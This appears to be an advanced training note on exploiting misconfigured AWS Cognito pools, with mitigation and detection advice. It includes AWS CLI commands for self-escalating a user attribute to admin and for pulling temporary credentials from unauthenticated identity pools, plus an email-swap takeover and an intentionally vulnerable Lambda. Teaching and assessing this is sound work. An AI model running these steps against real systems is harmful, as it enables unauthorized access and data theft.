---
tags: [aws, cognito, authentication, cloud, iam]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.11 AWS Cognito"
---

# AWS Cognito — Misconfigured User Pools

## 1. Introduction to Amazon Cognito
Amazon Cognito provides authentication, authorization, and user management for web and mobile apps. It consists of two main components:
1. **User Pools**: User directories that provide sign-up and sign-in options for app users. They issue JSON Web Tokens (JWTs) (ID, Access, and Refresh tokens) upon successful authentication.
2. **Identity Pools (Federated Identities)**: Enable users to obtain temporary, limited-privilege AWS credentials to directly access other AWS services (like S3, DynamoDB, or Lambda) without needing to hit a backend API first.

Cognito is highly customizable, which makes it complex. Misconfigurations in how User Pools and Identity Pools are deployed regularly lead to severe vulnerabilities, including privilege escalation, unauthorized account creation, and direct AWS account compromise.

## 2. Core Vulnerabilities and Misconfigurations

### 2.1 Unauthenticated Access to Identity Pools
Identity Pools can be configured to support *Unauthenticated Identities*. This feature is intended for scenarios where a guest user needs limited access (e.g., reading public data from S3 or pushing analytics events).
If an administrator mistakenly attaches an overly permissive IAM role to the unauthenticated identity (e.g., `AmazonS3FullAccess` or `AdministratorAccess`), any user on the internet can request temporary AWS credentials and compromise the cloud environment.

### 2.2 Self-Registration and Admin-Only Groups
Often, applications have an "Admin" panel and a "Customer" panel. The developers might use a single Cognito User Pool. They intend for admins to be created manually by IT, while customers can self-register.
If self-registration is enabled globally on the User Pool and the application fails to restrict attribute modification during sign-up, an attacker can register a new account and inject custom attributes (e.g., `custom:role = admin`).

### 2.3 Mutable Standard and Custom Attributes
Cognito allows storing user data in attributes. By default, users can update their own attributes using the `UpdateUserAttributes` API call, assuming they hold a valid Access Token.
If attributes like `custom:tenant_id`, `custom:role`, or `email` are marked as writable by the user, an attacker can authenticate, call the Cognito API directly, modify their role to `admin` or change their `tenant_id` to access another customer's environment.

### 2.4 Pre-Token Generation Lambda Abuse
Cognito allows triggering AWS Lambda functions at various stages of the authentication lifecycle. The **Pre-Token Generation** trigger is used to customize the claims added to the JWT.
If this Lambda function dynamically fetches roles from a database using user-provided input (without sanitization), it can be vulnerable to SQL injection or logical bypasses, allowing an attacker to manipulate the claims embedded in their final, cryptographically signed JWT.

## 3. Attack Flow and Visual Architecture

```text
+-----------------------------------------------------------------------------------+
|  Attacker Client                                                                  |
|                                                                                   |
|  1. Discovers Cognito Client ID and Identity Pool ID in frontend JavaScript.      |
|     (e.g., ap-south-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)                       |
+---------+-------------------------------------------------------------------------+
          |
          | 2. AWS CLI / SDK: Request Unauthenticated Identity ID
          v
+---------+-------------------------------------------------------------------------+
|  Amazon Cognito Identity Pool                                                     |
|  (Configured with "Enable access to unauthenticated identities": TRUE)            |
|                                                                                   |
|  <- 3. Returns Identity ID (e.g., ap-south-1:1234-5678-abcd)                      |
+---------+-------------------------------------------------------------------------+
          |
          | 4. AWS CLI / SDK: GetCredentialsForIdentity(IdentityID)
          v
+---------+-------------------------------------------------------------------------+
|  AWS STS (Security Token Service) via Cognito                                     |
|                                                                                   |
|  * Evaluates IAM Role attached to Unauthenticated users.                          |
|  * FLAW: Role has `s3:*` and `dynamodb:*` permissions.                            |
|                                                                                   |
|  <- 5. Returns Temporary AWS Credentials (AccessKey, SecretKey, SessionToken)     |
+---------+-------------------------------------------------------------------------+
          |
          | 6. Attacker configures AWS CLI with stolen credentials
          v
+---------+-------------------------------------------------------------------------+
|  AWS Environment (S3, DynamoDB, EC2, etc.)                                        |
|  * Attacker uses `aws s3 sync` to dump sensitive databases and buckets.           |
+-----------------------------------------------------------------------------------+
```

## 4. Exploitation Walkthrough

### 4.1 Reconnaissance: Extracting App Client IDs
Cognito integrates deeply with frontend applications (React, Angular, mobile apps). The configuration parameters are completely public and embedded in the source code.
An attacker views the page source or uses Burp Suite to find:
- `UserPoolId` (e.g., `us-east-1_xxxxxxxxx`)
- `ClientId` (e.g., `1a2b3c4d5e6f7g8h9i0j`)
- `IdentityPoolId` (e.g., `us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`)

### 4.2 Exploiting Attribute Mutability (Privilege Escalation)
1. The attacker registers a standard user account and signs in to obtain their Access Token.
2. They inspect the JWT payload (using `jwt.io`) and notice a custom claim: `"custom:group": "user"`.
3. The attacker uses the AWS CLI to attempt to modify this attribute:
```bash
aws cognito-idp update-user-attributes \
  --access-token <ATTACKER_ACCESS_TOKEN> \
  --user-attributes Name="custom:group",Value="admin" \
  --region us-east-1
```
4. If the developer left `custom:group` as a "Writable" attribute in the Cognito User Pool App Client settings, the API call succeeds.
5. The attacker logs out, logs back in, and the new JWT contains `"custom:group": "admin"`, granting them administrative access to the backend application.

### 4.3 Exploiting Unauthenticated Identity Pools
1. The attacker uses the extracted `IdentityPoolId` to request an ID:
```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx \
  --region us-east-1
```
Output:
```json
{
    "IdentityId": "us-east-1:11111111-2222-3333-4444-555555555555"
}
```
2. The attacker uses this ID to request temporary AWS credentials:
```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:11111111-2222-3333-4444-555555555555 \
  --region us-east-1
```
Output:
```json
{
    "Credentials": {
        "AccessKeyId": "ASIA.........",
        "SecretKey": ".................",
        "SessionToken": ".................",
        "Expiration": 1620000000.0
    }
}
```
3. The attacker configures their local AWS CLI profile with these credentials.
4. They run enumeration tools like `pacu` or `aws iam get-caller-identity` and begin exploiting the attached IAM role's permissions.

## 5. Account Takeover via Email Modification
If users are permitted to change their email address, and the backend application uses the email address as the primary identifier (instead of the unique Cognito `sub` UUID), an attacker can:
1. Register an account with `attacker@evil.com`.
2. Update their Cognito email attribute to `victim@company.com`.
3. If the application does not require email verification before applying the change, or if it trusts the unverified email, the attacker can now log in and take over the victim's profile within the app.

## 6. Mitigation and Best Practices

### 6.1 Secure App Client Attribute Read/Write Permissions
In the AWS Console under Cognito User Pools -> App Clients -> Attribute Read and Write Permissions:
- Uncheck the "Write" permission for any sensitive custom attributes (e.g., roles, tenant IDs, admin flags). Only backend administrative APIs (using AWS IAM credentials, not user tokens) should be able to update `AdminUpdateUserAttributes`.

### 6.2 Disable Unauthenticated Access (Unless Strictly Necessary)
If your application does not require guest access to AWS resources, explicitly disable "Enable access to unauthenticated identities" in the Identity Pool settings.
If it *is* required, ensure the attached IAM role follows absolute Least Privilege (e.g., only `s3:PutObject` to a specific prefix, no read access).

### 6.3 Prevent Arbitrary Sign-ups
If the application is internal-only or invite-only, disable "Allow users to sign themselves up". Administrators should provision users via `AdminCreateUser`.

### 6.4 Validate Claims on the Backend
Never trust that attributes haven't been tampered with if they are mutable. Backend systems should verify roles and tenant isolation via a source of truth (like a database) rather than relying solely on the JWT claims, OR strictly ensure those claims are immutable by the user.

## 7. Detection and Monitoring

### 7.1 CloudTrail and CloudWatch
Monitor `UpdateUserAttributes` API calls where critical attributes (like `role` or `is_admin`) are being modified by non-administrative users.
Monitor the IAM role assigned to Unauthenticated Cognito users for unusual API calls (e.g., `DescribeInstances`, `ListBuckets`). Guest roles should not be performing recon.

### 7.2 AWS Security Hub
Security Hub contains rules to check if Cognito User Pools have advanced security features enabled and if password policies meet organizational standards.

## 8. Chaining Opportunities
- **[[10 - AWS API Gateway — Authorization Bypass]]**: Manipulating Cognito attributes directly leads to bypassing logical checks in API Gateway authorizers.
- **[[12 - AWS IAM Privilege Escalation]]**: Once temporary AWS credentials are obtained from an Identity Pool, attackers use IAM privilege escalation techniques to gain Administrator access.
- **[[14 - GCP Cloud Storage — Public Bucket Access]]**: While GCP specific, similar concepts apply if Cognito issues credentials that grant excessive S3 access, allowing attackers to dump buckets.

## 9. Related Notes
- [[05 - JSON Web Token (JWT) Exploitation]]
- [[01 - API1 — Broken Object Level Authorization (BOLA)]]
- [[02 - SSRF in Cloud Environments]]

## 10. Advanced Pre-Token Generation Lambda Vulnerabilities
The Pre-Token Generation trigger is powerful but dangerous. If developers write custom logic to fetch user permissions from a DynamoDB table during login, vulnerabilities in that Lambda function directly compromise the authentication flow.

Consider a Lambda function that queries permissions based on an event attribute:
```python
import boto3
import json

dynamodb = boto3.client('dynamodb')

def lambda_handler(event, context):
    user_id = event['request']['userAttributes']['custom:internal_id']
    
    # VULNERABILITY: Unsanitized user attribute used in a database query
    # An attacker modifying their 'custom:internal_id' to point to an admin's ID
    # could hijack the admin's permissions.
    response = dynamodb.get_item(
        TableName='UserPermissions',
        Key={'internal_id': {'S': user_id}}
    )
    
    roles = response.get('Item', {}).get('roles', {}).get('S', 'user')
    
    event['response']['claimsOverrideDetails'] = {
        'claimsToAddOrOverride': {
            'role': roles
        }
    }
    return event
```
Because the attacker can modify their `custom:internal_id` (if the attribute is writable), they can force the Lambda to fetch and embed an administrator role into their JWT.

## 11. Exploiting the "AdminCreateUser" vs "SignUp" Logic
When evaluating a Cognito implementation, look for endpoints in the frontend application that trigger `SignUp` (self-service) versus those that hit a backend API that triggers `AdminCreateUser`.
If a backend API endpoint meant only for internal use triggers `AdminCreateUser` and does not require adequate authorization, an attacker can bypass all Cognito sign-up restrictions (such as required domains or email verification) and provision a fully verified account directly.

## 12. Security Assessment Checklist for AWS Cognito
When pentesting an AWS Cognito deployment, follow these verification steps:
1. **Unauthenticated Identities**: Check the Identity Pool. Are they enabled? If yes, what is the exact IAM policy attached to the unauthenticated role?
2. **Attribute Mutability**: List the App Client settings. Which standard and custom attributes have "Write" permissions enabled for the client?
3. **Lambda Triggers**: Are there any Pre-SignUp, Pre-Authentication, or Pre-Token Generation triggers? Review their source code for injection or logical bypasses.
4. **App Client Secret**: Is the App Client configured with a client secret? (If it's a web/mobile SPA, it shouldn't be, but if it is, ensure it hasn't been leaked).
5. **Token Expiration**: Are the Access Tokens and ID Tokens configured with a short lifespan (e.g., 60 minutes or less)? Are Refresh Tokens heavily restricted?
